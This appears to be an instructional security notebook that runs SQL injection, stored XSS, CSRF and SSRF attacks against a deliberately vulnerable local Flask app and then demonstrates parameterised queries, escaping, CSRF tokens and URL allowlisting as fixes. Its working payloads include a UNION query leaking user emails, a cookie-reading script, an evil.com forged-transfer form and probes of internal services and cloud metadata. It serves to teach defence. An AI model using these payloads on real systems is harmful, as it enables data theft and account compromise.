# 📖 Notebook 2: Common Web Vulnerabilities

In this notebook, we'll **attack** our Flask app with the four most common web vulnerabilities, then **fix** each one.

These vulnerabilities are in the [OWASP Top 10](https://owasp.org/www-project-top-ten/) — the industry-standard list of critical web security risks.

## Learning Objectives

By the end of this notebook, you'll understand:
- How SQL injection works and how to prevent it
- How Cross-Site Scripting (XSS) works and how to prevent it
- How Cross-Site Request Forgery (CSRF) works and how to prevent it
- How Server-Side Request Forgery (SSRF) works and how to prevent it
- Why each fix works at a technical level

## 🛠️ Setup

Make sure Docker is running:

```bash
cd enterprise-patterns/security-review
docker-compose up -d
```

### Kernel Selection

Select the `.venv` kernel in VS Code's kernel picker (top-right of notebook).  
If it doesn't appear, reload the window: `Cmd+Shift+P` → "Reload Window".

In [ ]:
import requests
import json

BASE_URL = "http://localhost:5001"

# Verify the Flask app is running
try:
    resp = requests.get(f"{BASE_URL}/health")
    print(f"✅ Flask app is running: {resp.json()}")
except requests.ConnectionError:
    print("❌ Flask app is not running. Run: docker-compose up -d")

---

## 🚨 Vulnerability 1: SQL Injection

**OWASP Category**: A03:2021 — Injection

### What is SQL Injection?

SQL injection happens when user input is **directly inserted into a SQL query** without sanitization. The attacker sends input that changes the query's meaning.

### How our vulnerable code works

```python
# 🚨 VULNERABLE — string concatenation
sql = f"SELECT id, name, price FROM products WHERE name LIKE '%{query}%'"
cur.execute(sql)
```

If the user searches for `laptop`, the query becomes:
```sql
SELECT id, name, price FROM products WHERE name LIKE '%laptop%'
```

But if the user searches for `' OR '1'='1' --`, the query becomes:
```sql
SELECT id, name, price FROM products WHERE name LIKE '%' OR '1'='1' --%'
```

The `OR '1'='1'` is always true, so it returns **ALL products**. The `--` comments out the rest of the query.

In [ ]:
# === ATTACK 1A: SQL Injection — Extract ALL products ===

print("Normal search for 'Laptop':")
resp = requests.get(f"{BASE_URL}/api/products/search", params={"q": "Laptop"})
products = resp.json()
print(f"  Found {len(products)} products")
for p in products[:3]:
    print(f"  - {p['name']} (${p['price']})")

print("\n" + "=" * 60)
print("\n🚨 SQL Injection attack — get ALL products:")
payload = "' OR '1'='1' --"
print(f"  Payload: {payload}")
resp = requests.get(f"{BASE_URL}/api/products/search", params={"q": payload})
products = resp.json()
print(f"  Found {len(products)} products (ALL of them!)")
for p in products[:5]:
    print(f"  - {p['name']} (${p['price']})")

print(f"\n⚠️  The attacker got all {len(products)} products instead of a filtered set!")

In [ ]:
# === ATTACK 1B: SQL Injection — Extract data from OTHER tables (UNION attack) ===

# The UNION attack lets us combine results from different tables
# Our products query returns 3 columns (id, name, price)
# So we UNION with a query that also returns 3 columns from the users table

union_payload = "' UNION SELECT id, username || ':' || email, 0 FROM users --"
print(f"🚨 UNION SQL Injection — extracting user data:")
print(f"  Payload: {union_payload}")

resp = requests.get(f"{BASE_URL}/api/products/search", params={"q": union_payload})
results = resp.json()

print(f"\n  Results ({len(results)} rows):")
for r in results:
    if ":" in r["name"] and "@" in r["name"]:
        print(f"  🔴 LEAKED USER DATA: {r['name']}")

print("\n⚠️  The attacker extracted usernames and emails from the users table!")
print("In a real app, they could also extract password hashes, API keys, etc.")

In [ ]:
# === FIX: Parameterized queries prevent SQL injection ===

print("✅ Testing the SAFE endpoint with the same attack payloads:\n")

# Try the OR 1=1 attack
payload1 = "' OR '1'='1' --"
resp = requests.get(f"{BASE_URL}/api/products/search/safe", params={"q": payload1})
print(f"Payload: {payload1}")
print(f"  Results: {len(resp.json())} products (the payload is treated as literal text)")

# Try the UNION attack
payload2 = "' UNION SELECT id, username || ':' || email, 0 FROM users --"
resp = requests.get(f"{BASE_URL}/api/products/search/safe", params={"q": payload2})
print(f"\nPayload: {payload2}")
print(f"  Results: {len(resp.json())} products (UNION is treated as literal text)")

# Normal search still works
resp = requests.get(f"{BASE_URL}/api/products/search/safe", params={"q": "Laptop"})
print(f"\nNormal search 'Laptop': {len(resp.json())} products")

print("\n✅ Parameterized queries treat the ENTIRE input as data, not as SQL code.")
print("The database driver escapes special characters automatically.")

### Why Parameterized Queries Work

```python
# ✅ SAFE — parameterized query
sql = "SELECT id, name, price FROM products WHERE name LIKE %s"
cur.execute(sql, (f"%{query}%",))
```

With parameterized queries:
1. The SQL structure is sent to the database **first**
2. The parameters are sent **separately**
3. The database treats parameters as **data only**, never as SQL code
4. Special characters like `'`, `--`, `UNION` are automatically escaped

**Rule: NEVER build SQL strings with f-strings, `.format()`, or `+` concatenation.**

---

## 🚨 Vulnerability 2: Cross-Site Scripting (XSS)

**OWASP Category**: A03:2021 — Injection

### What is XSS?

XSS happens when an attacker injects **JavaScript code** into a web page that other users view. The injected code runs in the victim's browser with full access to their session.

### Types of XSS

| Type | How It Works | Persistence |
|------|-------------|-------------|
| **Stored XSS** | Malicious script saved in database, served to all users | Permanent until removed |
| **Reflected XSS** | Malicious script in URL parameter, reflected in response | One-time per click |
| **DOM-based XSS** | Client-side JavaScript processes untrusted data | Client-only |

Our demo uses **Stored XSS** — the attacker saves a malicious comment in the database.

In [ ]:
# === ATTACK 2: Stored XSS — inject JavaScript via a comment ===

# First, add a comment with a JavaScript payload
xss_payload = '<script>alert("XSS! I could steal your cookies: " + document.cookie)</script>'

print("🚨 Injecting XSS payload as a product comment...")
print(f"  Payload: {xss_payload}")

resp = requests.post(f"{BASE_URL}/api/comments", json={
    "user_id": 2,
    "product_id": 1,
    "content": xss_payload
})
print(f"  Comment created: {resp.json()}")

# Now fetch the comments page (vulnerable version)
print("\n📄 Fetching the VULNERABLE comments page...")
resp = requests.get(f"{BASE_URL}/comments/1")
html = resp.text

print(f"  Response HTML (first 500 chars):")
print(f"  {html[:500]}")

if "<script>" in html:
    print("\n⚠️  The <script> tag is in the HTML! In a browser, this JavaScript")
    print("   would execute and could steal the user's session cookie.")
    print("   An attacker could send the cookie to their own server.")

In [ ]:
# === FIX: HTML escaping prevents XSS ===

print("✅ Fetching the SAFE comments page...")
resp = requests.get(f"{BASE_URL}/comments/1/safe")
html = resp.text

print(f"  Response HTML (first 500 chars):")
print(f"  {html[:500]}")

if "&lt;script&gt;" in html:
    print("\n✅ The <script> tag has been HTML-escaped to &lt;script&gt;")
    print("   The browser will display it as text, NOT execute it as code.")

if "<script>" not in html:
    print("\n✅ No raw <script> tags in the HTML — XSS is prevented!")

print("\n💡 The fix uses markupsafe.escape() to convert:")
print("   < → &lt;")
print("   > → &gt;")
print("   \" → &quot;")
print("   & → &amp;")

### Additional XSS Defenses

HTML escaping is the minimum. Production apps also use:

| Defense | What It Does |
|---------|-------------|
| **Content-Security-Policy header** | Tells browser to only run scripts from trusted sources |
| **HttpOnly cookies** | Prevents JavaScript from reading session cookies |
| **Template auto-escaping** | Frameworks like Jinja2 can escape by default |
| **Input validation** | Reject input that looks like HTML/JavaScript |

---

## 🚨 Vulnerability 3: Cross-Site Request Forgery (CSRF)

**OWASP Category**: Broken Access Control / Insecure Design

### What is CSRF?

CSRF tricks a logged-in user into making a request they didn't intend. Imagine:

1. Alice is logged into her bank at `bank.com`
2. Alice visits `evil.com` (a malicious site)
3. `evil.com` contains a hidden form that submits to `bank.com/transfer`
4. Because Alice's browser has the bank's session cookie, the transfer goes through
5. Alice just transferred money to the attacker — without clicking anything!

```html
<!-- evil.com's hidden form -->
<form action="http://bank.com/api/transfer" method="POST" id="csrf-form">
    <input type="hidden" name="to_user" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

In [ ]:
# === ATTACK 3: CSRF — transfer funds without user consent ===

print("🚨 CSRF Attack Simulation")
print("=" * 60)
print("\nScenario: A malicious website submits a transfer request")
print("to our app. Because there's no CSRF protection, it works.\n")

# Simulate a request from evil.com (no CSRF token, different Origin)
resp = requests.post(
    f"{BASE_URL}/api/transfer",
    json={
        "from_user": "alice",
        "to_user": "attacker",
        "amount": 10000,
    },
    headers={"Origin": "http://evil.com"}  # request comes from attacker's site
)

print(f"Response status: {resp.status_code}")
print(f"Response body:   {resp.json()}")
print("\n⚠️  Transfer succeeded! The server didn't check:")
print("   1. Where the request came from (Origin header)")
print("   2. Whether a CSRF token was included")
print("   3. Whether the user actually initiated this action")

In [ ]:
# === FIX: CSRF protection with Origin check and CSRF token ===

print("✅ Testing the SAFE transfer endpoint\n")

# Attack 1: Request from evil.com (wrong Origin)
resp = requests.post(
    f"{BASE_URL}/api/transfer/safe",
    json={"from_user": "alice", "to_user": "attacker", "amount": 10000},
    headers={"Origin": "http://evil.com"}
)
print(f"From evil.com Origin: {resp.status_code} — {resp.json()}")

# Attack 2: Correct Origin but no CSRF token
resp = requests.post(
    f"{BASE_URL}/api/transfer/safe",
    json={"from_user": "alice", "to_user": "bob", "amount": 50},
    headers={"Origin": "http://localhost:5001"}
)
print(f"No CSRF token:       {resp.status_code} — {resp.json()}")

print("\n✅ Both attacks blocked! The safe endpoint requires:")
print("   1. Origin header matches allowed list")
print("   2. Valid CSRF token in X-CSRF-Token header")
print("   3. CSRF token matches the one stored in Redis for the session")

### CSRF Prevention Best Practices

| Defense | How It Works |
|---------|-------------|
| **CSRF Token** | Server generates a random token, stores in session. Client must send it back. |
| **SameSite Cookies** | `Set-Cookie: session=abc; SameSite=Strict` — browser won't send cookie from other sites |
| **Origin/Referer Check** | Server rejects requests from unexpected origins |
| **Custom Headers** | Require `X-Requested-With: XMLHttpRequest` (browsers block this cross-origin) |

---

## 🚨 Vulnerability 4: Server-Side Request Forgery (SSRF)

**OWASP Category**: A10:2021 — Server-Side Request Forgery

### What is SSRF?

SSRF happens when an attacker makes **your server** send HTTP requests to internal resources that should be unreachable from the internet.

```
Internet          Your Server          Internal Network
┌────────┐       ┌──────────┐         ┌──────────────┐
│Attacker│──────▶│ Flask App│────────▶│ Redis :6379  │
│        │       │          │         │ Postgres:5432│
│ "fetch  │       │/api/     │         │ AWS metadata │
│  this   │       │fetch-url │         │ 169.254.169. │
│  URL"   │       │          │         │ 254          │
└────────┘       └──────────┘         └──────────────┘
     ❌                                     ❌
  Can't reach                          Attacker reaches
  directly                             via YOUR server
```

The most famous SSRF attack was the **2019 Capital One breach**: an attacker used SSRF to access AWS metadata credentials, stealing data on 100 million customers.

In [ ]:
# === ATTACK 4A: SSRF — Access internal services ===

print("🚨 SSRF Attack — Accessing Internal Services")
print("=" * 60)

# The Flask app's /api/fetch-url will fetch ANY URL the user provides

# Attack 1: Probe for internal services
internal_targets = [
    ("http://localhost:5001/health", "Flask app itself"),
    ("http://localhost:6379", "Redis (if reachable)"),
    ("http://localhost:8080", "Adminer (admin panel)"),
]

for url, description in internal_targets:
    try:
        resp = requests.get(
            f"{BASE_URL}/api/fetch-url",
            params={"url": url},
            timeout=5
        )
        data = resp.json()
        status = data.get("status_code", "error")
        content_preview = data.get("content", data.get("error", ""))[:100]
        print(f"\n🔴 {description} ({url}):")
        print(f"   Status: {status}")
        print(f"   Content: {content_preview}...")
    except Exception as e:
        print(f"\n⚪ {description}: {e}")

print("\n⚠️  The attacker used our server as a proxy to reach internal services!")
print("   In AWS, they could hit http://169.254.169.254/latest/meta-data/")
print("   to steal IAM credentials (like the Capital One breach).")

In [ ]:
# === FIX: URL validation, allowlisting, and IP blocking ===

print("✅ Testing the SAFE fetch-url endpoint\n")

test_cases = [
    # (url, description, should_work)
    ("http://localhost:5001/health", "HTTP (not HTTPS)", False),
    ("https://localhost:5001/health", "Internal address", False),
    ("https://evil.com/steal-data", "Domain not in allowlist", False),
    ("https://httpbin.org/get", "Allowed domain (httpbin.org)", True),
]

for url, description, should_work in test_cases:
    resp = requests.get(f"{BASE_URL}/api/fetch-url/safe", params={"url": url})
    status = "✅" if (resp.status_code == 200) == should_work else "❌"
    print(f"  {status} {description}")
    print(f"     URL: {url}")
    print(f"     Response: {resp.status_code} — {resp.json().get('error', 'OK')}")
    print()

print("The safe endpoint enforces:")
print("  1. HTTPS only (no HTTP)")
print("  2. Block private/internal IP ranges (127.0.0.1, 10.x, 192.168.x, 169.254.x)")
print("  3. Domain allowlist (only fetch from approved domains)")
print("  4. DNS resolution check (resolve hostname, verify it's not private)")

---

## Summary: Vulnerable vs. Fixed Code

| Vulnerability | Vulnerable Pattern | Fixed Pattern |
|--------------|-------------------|---------------|
| **SQL Injection** | `f"SELECT * WHERE name = '{input}'"` | `cur.execute("SELECT * WHERE name = %s", (input,))` |
| **XSS** | `f"<div>{user_content}</div>"` | `f"<div>{escape(user_content)}</div>"` |
| **CSRF** | No token check | Validate CSRF token + check Origin header |
| **SSRF** | `requests.get(user_url)` | Allowlist domains + block private IPs + HTTPS only |

## Microsoft SDL Requirements for These Issues

| SDL Requirement | What It Means |
|----------------|---------------|
| **Use approved libraries** | Use ORM (SQLAlchemy) or parameterized queries — never raw string SQL |
| **Encode output** | All user-supplied data must be HTML-encoded before rendering |
| **Anti-forgery tokens** | All state-changing operations must use CSRF tokens |
| **Validate all input** | Allowlist validation for URLs, reject unexpected patterns |
| **Static analysis** | Run SAST tools (Bandit for Python) to catch these automatically |

## 🔑 Key Takeaways

1. **Never trust user input** — always validate, sanitize, and escape
2. **SQL Injection** is prevented with parameterized queries — never concatenate strings into SQL
3. **XSS** is prevented by escaping HTML output — use `markupsafe.escape()` or template auto-escaping
4. **CSRF** is prevented with tokens and origin checks — every state-changing request needs a CSRF token
5. **SSRF** is prevented with URL allowlists and IP blocking — never fetch arbitrary URLs from user input
6. These are the **most common** vulnerabilities — OWASP Top 10 has been tracking them for 20+ years

## ➡️ Next: Notebook 3 — Secrets Management

Our app has another problem: **hardcoded secrets in the source code**. Let's fix that.